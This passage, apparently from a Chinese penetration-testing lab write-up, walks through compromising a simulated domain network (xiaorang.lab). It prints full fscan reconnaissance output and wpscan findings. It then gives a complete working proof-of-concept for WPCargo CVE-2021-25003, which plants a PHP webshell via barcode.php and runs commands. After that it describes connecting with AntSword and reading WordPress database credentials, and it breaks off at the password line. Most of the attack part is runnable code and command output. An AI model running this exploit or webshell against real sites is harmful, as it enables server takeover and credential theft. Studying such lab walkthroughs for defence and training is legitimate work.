+</span></span><span class="line"><span class="ln">  4</span><span class="cl">│   / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
+</span></span><span class="line"><span class="ln">  5</span><span class="cl">│  / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
+</span></span><span class="line"><span class="ln">  6</span><span class="cl">│ / /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;     │
+</span></span><span class="line"><span class="ln">  7</span><span class="cl">│ <span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>   │
+</span></span><span class="line"><span class="ln">  8</span><span class="cl">└──────────────────────────────────────────────┘
+</span></span><span class="line"><span class="ln">  9</span><span class="cl">      Fscan Version: 2.0.0
+</span></span><span class="line"><span class="ln"> 10</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 暴力破解线程数: <span class="m">1</span>
+</span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始信息扫描
+</span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> CIDR范围: 172.22.2.0-172.22.2.255
+</span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 生成IP范围: 172.22.2.0.%!d<span class="o">(</span><span class="nv">string</span><span class="o">=</span>172.22.2.255<span class="o">)</span> - %!s<span class="o">(</span>MISSING<span class="o">)</span>.%!d<span class="o">(</span>MISSING<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255
+</span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 最终有效主机数量: <span class="m">256</span>
+</span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始主机扫描
+</span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 正在尝试无监听ICMP探测...
+</span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 当前用户权限不足,无法发送ICMP包
+</span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 切换为PING方式探测...
+</span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.2.3      存活 <span class="o">(</span>ICMP<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.2.7      存活 <span class="o">(</span>ICMP<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:58<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.2.16     存活 <span class="o">(</span>ICMP<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:59<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.2.18     存活 <span class="o">(</span>ICMP<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="o">[</span>2025-03-17 20:10:59<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.2.34     存活 <span class="o">(</span>ICMP<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 存活主机数量: <span class="m">5</span>
+</span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 有效端口数量: <span class="m">233</span>
+</span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.7:80
+</span></span><span class="line"><span class="ln"> 29</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.18:22
+</span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.7:22
+</span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.7:21
+</span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.3:445
+</span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.3:389
+</span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.34:139
+</span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.18:139
+</span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.34:135
+</span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.16:139
+</span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.3:139
+</span></span><span class="line"><span class="ln"> 39</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.16:135
+</span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.3:135
+</span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.34:445
+</span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.16:445
+</span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.16:80
+</span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.18:80
+</span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.3:88
+</span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.18:445
+</span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.16:1433
+</span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.2.7:6379
+</span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.18:22 <span class="o">=</span>&gt; <span class="o">[</span>ssh<span class="o">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="p">;</span> protocol 2.0 Banner:<span class="o">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.7:22 <span class="o">=</span>&gt; <span class="o">[</span>ssh<span class="o">]</span> 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:<span class="o">[</span>SSH-2.0-OpenSSH_7.4.<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.7:21 <span class="o">=</span>&gt; <span class="o">[</span>ftp<span class="o">]</span> 版本:3.0.2 产品:vsftpd 系统:Unix Banner:<span class="o">[</span><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.2<span class="o">)</span>.<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.7:80 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span> 版本:1.20.1 产品:nginx
+</span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.3:445 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.3:389 <span class="o">=</span>&gt; <span class="o">[</span>ldap<span class="o">]</span> 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
+</span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.34:139 <span class="o">=</span>&gt;  Banner:<span class="o">[</span>.<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.16:139 <span class="o">=</span>&gt;  Banner:<span class="o">[</span>.<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 57</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.3:139 <span class="o">=</span>&gt;  Banner:<span class="o">[</span>.<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.34:445 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.16:445 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.16:80 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span> 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows
+</span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.3:88 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:11<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.16:1433 <span class="o">=</span>&gt; <span class="o">[</span>ms-sql-s<span class="o">]</span> 版本:13.00.4001<span class="p">;</span> SP1 产品:Microsoft SQL Server <span class="m">2016</span> 系统:Windows Banner:<span class="o">[</span>.%.<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:11<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.7:6379 <span class="o">=</span>&gt; <span class="o">[</span>redis<span class="o">]</span> 版本:5.0.12 产品:Redis key-value store
+</span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="o">[</span>2025-03-17 20:11:11<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.18:80 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 65</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:05<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.18:139 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:06<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.18:445 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.34:135 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 68</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.16:135 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.2.3:135 <span class="o">=</span>&gt; 
+</span></span><span class="line"><span class="ln"> 70</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 存活端口数量: <span class="m">21</span>
+</span></span><span class="line"><span class="ln"> 71</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始漏洞扫描
+</span></span><span class="line"><span class="ln"> 72</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle
+</span></span><span class="line"><span class="ln"> 73</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> NetInfo 扫描结果
+</span></span><span class="line"><span class="ln"> 74</span><span class="cl">目标主机: 172.22.2.3
+</span></span><span class="line"><span class="ln"> 75</span><span class="cl">主机名: DC
+</span></span><span class="line"><span class="ln"> 76</span><span class="cl">发现的网络接口:
+</span></span><span class="line"><span class="ln"> 77</span><span class="cl">   IPv4地址:
+</span></span><span class="line"><span class="ln"> 78</span><span class="cl">      └─ 172.22.2.3
+</span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found
+</span></span><span class="line"><span class="ln"> 80</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> NetBios 172.22.2.34     XIAORANG<span class="se">\C</span>LIENT01             
+</span></span><span class="line"><span class="ln"> 81</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS
+</span></span><span class="line"><span class="ln"> 82</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>
+</span></span><span class="line"><span class="ln"> 83</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>
+</span></span><span class="line"><span class="ln"> 84</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> NetInfo 扫描结果
+</span></span><span class="line"><span class="ln"> 85</span><span class="cl">目标主机: 172.22.2.16
+</span></span><span class="line"><span class="ln"> 86</span><span class="cl">主机名: MSSQLSERVER
+</span></span><span class="line"><span class="ln"> 87</span><span class="cl">发现的网络接口:
+</span></span><span class="line"><span class="ln"> 88</span><span class="cl">   IPv4地址:
+</span></span><span class="line"><span class="ln"> 89</span><span class="cl">      └─ 172.22.2.16
+</span></span><span class="line"><span class="ln"> 90</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> NetInfo 扫描结果
+</span></span><span class="line"><span class="ln"> 91</span><span class="cl">目标主机: 172.22.2.34
+</span></span><span class="line"><span class="ln"> 92</span><span class="cl">主机名: CLIENT01
+</span></span><span class="line"><span class="ln"> 93</span><span class="cl">发现的网络接口:
+</span></span><span class="line"><span class="ln"> 94</span><span class="cl">   IPv4地址:
+</span></span><span class="line"><span class="ln"> 95</span><span class="cl">      └─ 172.22.2.34
+</span></span><span class="line"><span class="ln"> 96</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:10<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> NetBios 172.22.2.18     WORKGROUP<span class="se">\U</span>BUNTU-WEB02        
+</span></span><span class="line"><span class="ln"> 97</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:11<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点
+</span></span><span class="line"><span class="ln"> 98</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:13<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> Redis 172.22.2.7:6379 发现未授权访问 文件位置:/usr/local/redis/db/module.so
+</span></span><span class="line"><span class="ln"> 99</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:17<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> Redis无密码连接成功: 172.22.2.7:6379
+</span></span><span class="line"><span class="ln">100</span><span class="cl"><span class="o">[</span>2025-03-17 20:12:18<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 扫描已完成: 37/37
+</span></span></code></pre></div><p>扫出来四台机子</p>
+<pre tabindex="0"><code>NetBios 172.22.2.34     XIAORANG\CLIENT01
+NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab
+NetBios 172.22.2.3      DC:DC.xiaorang.lab
+NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02 WordPress
+</code></pre><p><strong>172.22.2.18</strong>上有一个wordpress服务，看看能不能从这里入手</p>
+<p>拿wpscan扫一下</p>
+<pre tabindex="0"><code>proxychains4 wpscan --url 172.22.2.18 --api-token my_token
+</code></pre><p>扫出来一堆洞</p>
+<p>有个能够rce的，感觉比较好利用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">1</span><span class="cl">
+</span></span><span class="line"><span class="ln">2</span><span class="cl"> <span class="p">|</span> [!] Title: WPCargo <span class="p">&lt;</span> 6.9.0 - Unauthenticated RCE
+</span></span><span class="line"><span class="ln">3</span><span class="cl"> <span class="p">|</span>     Fixed in: 6.9.0
+</span></span><span class="line"><span class="ln">4</span><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="ln">5</span><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
+</span></span><span class="line"><span class="ln">6</span><span class="cl"> <span class="p">|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003
+</span></span></code></pre></div><p>找一下漏洞的poc</p>
+<p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">WPCargo &lt; 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities</a></p>
+<p>poc</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1"># This is a magic string that when treated as pixels and compressed using the png</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#39;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">encode_character_code</span><span class="p">(</span><span class="n">c</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="s1">&#39;</span><span class="si">{:08b}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">encode_character_code</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">payload</span><span class="p">)])[</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">destination_url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:8001/&#39;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;ls&#39;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"># With 1/11 scale, &#39;1&#39;s will be encoded as single white pixels, &#39;x&#39;s as single black pixels.</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">destination_url</span><span class="si">}</span><span class="s2">wp-content/plugins/wpcargo/includes/barcode.php?text=</span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&#34;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="c1"># We have uploaded a webshell - now let&#39;s use it to execute a command.</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">destination_url</span><span class="si">}</span><span class="s2">webshell.php?1=system&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
+</span></span></code></pre></div><p>成功RCE，用户是www-data</p>
+<p><img alt="image-20250317203216535" loading="lazy" src="../assets/image-20250317203216535.png"></p>
+<p>但是靶机不出网，没办法上线</p>
+<p>那就直接用蚁剑连</p>
+<p><img alt="image-20250317204451034" loading="lazy" src="../assets/image-20250317204451034.png"></p>
+<p>在wordpress的配置文件中找到数据库的账号密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">//</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="k">Database</span><span class="w"> </span><span class="n">settings</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="o">//</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="cm">/** The name of the database for WordPress */</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;wordpress&#39;</span><span class="w"> </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="cm">/** Database username */</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w"></span><span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;wpuser&#39;</span><span class="w"> </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="cm">/** Database password */</span><span class="w">
